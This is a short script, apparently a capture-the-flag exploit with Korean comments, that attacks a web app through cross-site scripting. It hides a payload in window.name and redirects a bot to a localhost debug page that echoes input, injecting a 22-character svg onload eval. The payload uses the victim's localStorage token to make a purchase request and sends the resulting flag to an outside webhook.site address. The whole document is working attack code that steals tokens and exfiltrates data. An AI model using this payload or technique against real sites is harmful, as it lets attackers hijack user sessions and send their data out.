<script>
    // 1. 봇이 실행할 실제 공격 코드 (플래그 구매 후 웹후크로 전송)
    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
    const payload = `
        fetch('/4/buy', {
            method: 'POST',
            headers: { 'token': localStorage.token }
        })
        .then(r => r.json())
        .then(d => {
            fetch('${webhook}?flag=' + d.data);
        });
    `;

    // 2. window.name에 페이로드 저장 (페이지 이동 후에도 유지됨)
    window.name = payload;

    // 3. localhost의 XSS 취약 지점으로 리다이렉트
    // /debug/:data는 딱 22글자까지만 출력하므로, 길이를 맞춘 페이로드를 보냅니다.
    // <svg/onload=eval(name)> 는 정확히 22글자입니다.
    location.href = "http://localhost:3000/#/item/1%2f..%2f..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
</script>
